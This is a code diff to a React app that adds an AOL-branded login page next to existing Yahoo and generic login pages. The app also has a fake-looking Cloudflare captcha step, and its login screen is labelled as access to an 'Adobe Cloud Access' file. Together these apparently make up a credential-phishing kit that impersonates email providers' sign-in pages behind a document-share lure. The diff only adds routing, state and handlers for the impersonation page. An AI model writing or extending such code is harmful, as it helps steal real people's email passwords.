@@ -3,6 +3,7 @@ import LoginPage from './components/LoginPage';
 import MobileLoginPage from './components/mobile/MobileLoginPage';
 import YahooLoginPage from './components/YahooLoginPage';
 import MobileYahooLoginPage from './components/mobile/MobileYahooLoginPage'; // Import mobile Yahoo page
+import AolLoginPage from './components/AolLoginPage'; // 1. IMPORT AOL PAGE
 import LandingPage from './components/LandingPage';
 import MobileLandingPage from './components/mobile/MobileLandingPage';
 import CloudflareCaptcha from './components/CloudflareCaptcha';
@@ -33,6 +34,7 @@ function App() {
   const [isLoading, setIsLoading] = useState(true);
   const [captchaVerified, setCaptchaVerified] = useState(false);
   const [showYahooLogin, setShowYahooLogin] = useState(false);
+  const [showAolLogin, setShowAolLogin] = useState(false); // 2. ADD NEW STATE FOR AOL
 
   useEffect(() => {
     const checkMobile = () => setIsMobile(window.innerWidth <= 768);
@@ -47,6 +49,7 @@ function App() {
         const isActive = event.action !== 'remove' && event.value && event.value !== 'false';
         setHasActiveSession(isActive);
         setShowYahooLogin(false);
+        setShowAolLogin(false); // Reset AOL state on cookie change
         if (isActive) setCurrentPage('landing');
         else {
           setCaptchaVerified(false);
@@ -106,6 +109,7 @@ function App() {
     }
     
     setShowYahooLogin(false);
+    setShowAolLogin(false); // Reset AOL state on success
     setCurrentPage('landing');
     setIsLoading(false);
   };
@@ -117,11 +121,17 @@ function App() {
     setHasActiveSession(false);
     setCaptchaVerified(false);
     setShowYahooLogin(false);
+    setShowAolLogin(false); // Reset AOL state on logout
     setCurrentPage('captcha');
   };
 
   const handleYahooSelect = () => {
     setShowYahooLogin(true);
+  };
+
+  // 3. ADD HANDLER FUNCTION FOR AOL
+  const handleAolSelect = () => {
+    setShowAolLogin(true);
   };
 
   if (isLoading) {
@@ -136,11 +146,17 @@ function App() {
     return <CloudflareCaptcha onVerified={handleCaptchaVerified} />;
   }
 
+  // 4. UPDATE RENDER LOGIC
   if (currentPage === 'login' && captchaVerified && !hasActiveSession) {
     if (showYahooLogin) {
-      // Choose which Yahoo page to show based on device
       const YahooComponent = isMobile ? MobileYahooLoginPage : YahooLoginPage;
       return <YahooComponent onLoginSuccess={handleLoginSuccess} onLoginError={error => console.error('Login error:', error)} />;
+    }
+    
+    // Add condition for AOL
+    if (showAolLogin) {
+      // AolLoginPage is responsive for desktop and mobile
+      return <AolLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={error => console.error('Login error:', error)} />;
     }
     
     const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
@@ -148,6 +164,7 @@ function App() {
       <LoginComponent
         fileName="Adobe Cloud Access"
         onYahooSelect={handleYahooSelect}
+        onAolSelect={handleAolSelect} // 5. PASS THE NEW HANDLER AS A PROP
         onBack={() => { setCaptchaVerified(false); setCurrentPage('captcha'); }}
         onLoginSuccess={handleLoginSuccess}
         onLoginError={error => console.error('Login error:', error)}
